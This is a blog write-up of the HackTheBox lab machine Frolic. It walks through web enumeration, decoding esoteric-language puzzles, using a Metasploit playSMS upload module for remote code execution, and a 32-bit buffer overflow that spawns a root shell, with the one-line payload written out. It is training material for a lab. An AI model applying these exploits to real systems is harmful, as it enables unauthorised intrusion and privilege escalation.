---
categories:
- CTF
layout: post
media_subpath: /assets/posts/2019-03-23-frolic-hackthebox
tags:
- binary exploitation
- ctf
- hackthebox
- js
- linux
- playsms
title: Frolic @ HackTheBox
---

Frolic is a medium difficulty machine on [hackthebox.eu](https://www.hackthebox.eu), featuring a lot of CTF-ish language conversions, the usage of a public exploit for "playsms" and (simple) custom binary exploit.

## User Flag

Starting off with a nmap scan we can see the following open ports:

```
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
1880/tcp open  http        Node.js (Express middleware)
9999/tcp open  http        nginx 1.10.3 (Ubuntu)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
137/udp open          netbios-ns  Samba nmbd netbios-ns (workgroup: WORKGROUP)
```

There are several potentially interesting ports here. We start by looking at port 9999 where we are greeted by a default nginx page. To look for more content we use gobuster:

```
gobuster -w ~/tools/SecLists/Discovery/Web-Content/raft-large-directories.txt -u http://frolic.htb:9999/

/admin (Status: 301)
/test (Status: 301)
/backup (Status: 301)
/dev (Status: 301)
```

Under "/admin" we get alogin page. When we try to enter some credentials we get a javascript popup notifying us about how many tries we have left. We look at the JavaScript under "/admin/js/login.js" and find a hard coded password:

```
var username = document.getElementById("username").value;
var password = document.getElementById("password").value;
if ( username == "admin" && password == "superduperlooperpassword_lol"){
alert ("Login successfully");
```

With these credentials we can log into the admin panel and are given a weird looking page:

```
..... ..... ..... .!?!! .?... ..... ..... ...?. ?!.?. ..... ..... ..... ..... ..... ..!.? ..... ..... .!?!! .?... ..... ..?.? !.?.. ..... ..... ....! ..... ..... .!.?. ..... .!?!! .?!!! !!!?. ?!.?! !!!!! !...! ..... ..... .!.!! !!!!! !!!!! !!!.? ..... ..... ..... ..!?! !.?!! !!!!! !!!!! !!!!? .?!.? !!!!! !!!!! !!!!! .?... ..... ..... ....! ?!!.? ..... ..... ..... .?.?! .?... ..... ..... ...!. !!!!! !!.?. ..... .!?!! .?... ...?. ?!.?. ..... ..!.? ..... ..!?! !.?!! !!!!? .?!.? !!!!! !!!!. ?.... ..... ..... ...!? !!.?! !!!!! !!!!! !!!!! ?.?!. ?!!!! !!!!! !!.?. ..... ..... ..... .!?!! .?... ..... ..... ...?. ?!.?. ..... !.... ..... ..!.! !!!!! !.!!! !!... ..... ..... ....! .?... ..... ..... ....! ?!!.? !!!!! !!!!! !!!!! !?.?! .?!!! !!!!! !!!!! !!!!! !!!!! .?... ....! ?!!.? ..... .?.?! .?... ..... ....! .?... ..... ..... ..!?! !.?.. ..... ..... ..?.? !.?.. !.?.. ..... ..!?! !.?.. ..... .?.?! .?... .!.?. ..... .!?!! .?!!! !!!?. ?!.?! !!!!! !!!!! !!... ..... ...!. ?.... ..... !?!!. ?!!!! !!!!? .?!.? !!!!! !!!!! !!!.? ..... ..!?! !.?!! !!!!? .?!.? !!!.! !!!!! !!!!! !!!!! !.... ..... ..... ..... !.!.? ..... ..... .!?!! .?!!! !!!!! !!?.? !.?!! !.?.. ..... ....! ?!!.? ..... ..... ?.?!. ?.... ..... ..... ..!.. ..... ..... .!.?. ..... ...!? !!.?! !!!!! !!?.? !.?!! !!!.? ..... ..!?! !.?!! !!!!? .?!.? !!!!! !!.?. ..... ...!? !!.?. ..... ..?.? !.?.. !.!!! !!!!! !!!!! !!!!! !.?.. ..... ..!?! !.?.. ..... .?.?! .?... .!.?. ..... ..... ..... .!?!! .?!!! !!!!! !!!!! !!!?. ?!.?! !!!!! !!!!! !!.!! !!!!! ..... ..!.! !!!!! !.?. 
```

This is a typical CTF language called Ook! (a variant of brainfuck) which we can decode (like most of the CTF languages) on [decode.fr](https://www.dcode.fr/ook-language). The decoded strings looks like this:

```
UEsDBBQACQAIAMOJN00j/lsUsAAAAGkCAAAJABwAaW5kZXgucGhwVVQJAAOFfKdbhXynW3V4CwAB BAAAAAAEAAAAAF5E5hBKn3OyaIopmhuVUPBuC6m/3PkAkp3GhHcjuWgNOL22Y9r7nrQEopVyJbs K1i6f+BQyOES4baHpOrQu+J4XxPATolb/2EU6rqOPKD8uIPkUoyU8cqgwNE0I19kzhkVA5RAmveEMrX4+T7al+fi/kY6ZTAJ3h/Y5DCFt2PdL6yNzVRrAuaigMOlRBrAyw0tdliKb40RrXpBgn/uoTjlurp78cmcTJviFfUnOM5UEsHCCP+WxSwAAAAaQIAAFBLAQIeAxQACQAIAMOJN00j/lsUsAAAAGkC AAAJABgAAAAAAAEAAACkgQAAAABpbmRleC5waHBVVAUAA4V8p1t1eAsAAQQAAAAABAAAAABQSwUG AAAAAAEAAQBPAAAAAwEAAAAA 
```

This looks like base64, but it contains some whitespaces which we need to remove. After removing the whitespaces with `sed 's/ ///g` We can decode it to binary (`base64 -d b64 > out`), which results in a password protected zip file. We try some passwords  
and eventually get it right with "password", giving us a new file "index.php" to work with. The file contains (again) nothing readable:

```
4b7973724b7973674b7973724b7973675779302b4b7973674b7973724b7973674b79737250463067506973724b7973674b7934744c5330674c5330754b7973674b7973724b7973674c6a77720d0a4b7973675779302b4b7973674b7a78645069734b4b797375504373674b7974624c5434674c53307450463067506930744c5330674c5330754c5330674c5330744c5330674c6a77724b7973670d0a4b317374506973674b79737250463067506973724b793467504373724b3173674c5434744c53304b5046302b4c5330674c6a77724b7973675779302b4b7973674b7a7864506973674c6930740d0a4c533467504373724b3173674c5434744c5330675046302b4c5330674c5330744c533467504373724b7973675779302b4b7973674b7973385854344b4b7973754c6a776743673d3d0d0a
```

Since this clearly looks like bytes we convert it to binary with `cat index.php | xxd -r -p` and get a base64 string that when decoded gives brainfuck code:

```
+++++ +++++ [->++ +++++ +++<] >++++ +.--- --.++ +++++ .<+++ [->++ +<]>+
++.<+ ++[-> ---<] >---- --.-- ----- .<+++ +[->+ +++<] >+++. <+++[ ->---
<]>-- .<+++ [->++ +<]>+ .---. <+++[ ->--- <]>-- ----. <++++ [->++ ++<]>
++..<
```

Using [decode.fr](https://www.dcode.fr/brainfuck-language) again we decode it and get the string "idkwhatispass".

I tried to use the password at several places but couldn’t find any place to use it at – so back to enumeration. Using gobuster recursively on the directories we found earlier we get "/dev/backup" on port 9999, which just contains the string "/playsms". When we go there in a web browser, we get a new web page and can login as "admin:idkwhatispass".

Researching about the app a little we find that there is a metasploit module for it `exploit/multi/http/playsms_uploadcsv_exec` which exploits a file upload functionality to get RCE. We continue by using the module to get a shell and read the user flag.

## Root Flag

In the home folder of "ayush" we find a setuid binary ".binary/rop":

```
rop: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=59da91c100d138c662b77627b65efbbc9f797394, not stripped
```

This strongly hints that we have to exploit this binary in order to get root. First we check what security features are enabled – we start by checking if aslr is enabled:

```
cat /proc/sys/kernel/randomize_va_space
0
```

Fortunately no aslr is enabled, what about the binary itself ? We load it into gdb (with the gef plugin enabled) and run `checksec`:

```
gef➤  checksec
[+] checksec for '~/htb/Frolic/rop'
Canary                        : No
NX                            : Yes
PIE                           : No
Fortify                       : No
RelRO                         : Partial
```

We learned that we are dealing with NX, which means that the stack is not executable and we have to use rop or ret2libc in order to exploit it. The next step is to run the binary to get a feeling for it while trying some inputs that could lead to crashes:

```
gef➤  run
Starting program: ~/htb/Frolic/rop
[*] Usage: program <message>
[Inferior 1 (process 6311) exited with code 0377]

gef➤  run $(python2 -c 'print "A"*100')
[!] Cannot disassemble from $PC
[!] Cannot access memory at address 0x41414141
```

We managed to crash the binary by sending 100 times "A", resulting in an overwrite of the instruction pointer with "A"s. In order to take control of the instruction pointer we have to find its offset within our input:

```
gef➤  pattern create 100
[+] Generating a pattern of 100 bytes
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa

gef➤  run aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaa

[!] Cannot disassemble from $PC
[!] Cannot access memory at address 0x6161616e

gef➤  pattern offset 0x6161616e
[+] Searching '0x6161616e'
[+] Found at offset 52 (little-endian search) likely
[+] Found at offset 49 (big-endian search)
```

By creating a unique pattern inside gef and finding out which part of the pattern ends up as the value of the instruction pointer, we found that the offset is actually 52. The most simple way to exploit this, is to use [one\_gadget](https://github.com/david942j/one_gadget), which searches in a given libc for addresses that give a shell upon jumping to them. We could also manually prepare the stack with a pointer to "/bin/sh" and a call to system to get a shell, but I will go with one\_gadget for this writeup.

We copy over the libc from the target system to our attacker box in order to find the correct offsets which we need for our exploit and run one\_gadget:

```
➜  Frolic ~/tools/one_gadget/bin/one_gadget libc.so.6
0x3ac5c execve("/bin/sh", esp+0x28, environ)
constraints:
  esi is the GOT address of libc
  [esp+0x28] == NULL
0x3ac5e execve("/bin/sh", esp+0x2c, environ)
constraints:
  esi is the GOT address of libc
  [esp+0x2c] == NULL

0x3ac62 execve("/bin/sh", esp+0x30, environ)
constraints:
  esi is the GOT address of libc
  [esp+0x30] == NULL
...
```

The tool always gives multiple offsets that have different constraints to them, you can see if these constraints hold by debugging the binary or you can just try all of the results. In this case we can take the first result.

The final exploit consists of 52 bytes of padding followed by the magic gadget:

```
$(python2 -c 'print "A"*52+"\x5c\x3c\xe5\xb7"')
```

We continue by executing the exploit on the target, resulting in a root shell and the retrieval of the root flag. I enjoyed the box a lot, many thanks to the creator [felamos](https://twitter.com/_felamos).